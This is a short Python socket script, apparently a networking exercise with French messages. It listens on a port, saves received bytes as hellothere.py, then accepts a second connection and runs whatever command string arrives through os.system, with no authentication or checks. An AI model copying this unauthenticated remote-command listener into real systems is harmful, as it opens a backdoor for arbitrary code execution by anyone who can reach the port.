import socket
import os 

HOST = '192.168.2.2'
PORT = 1235

client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
client.bind (( HOST, PORT))
client.listen(1)

serveur, adresseServeur = client.accept()
print ('connexion de ', adresseServeur)  

fichier = open ("hellothere.py", 'wb')

print ('Reception...')
message = serveur.recv(50)

while (message):
	fichier.write(message)
	message = serveur.recv(50)

fichier.close()
print ('Reception du fichier bien effectuée')

serveur.send('1'.encode())

# recieving command

serveur, adresseServeur = client.accept()

cmd = serveur.recv(1024).decode()

print ('Reception de la commande bien effectuéée')
print ('La commande à executer : '+cmd + " > result.txt")

os.system(cmd + " > result.txt")

# closing

print('Fermeture de la connexion avec le client.')
serveur.close()
print('deconnexion')
client.close
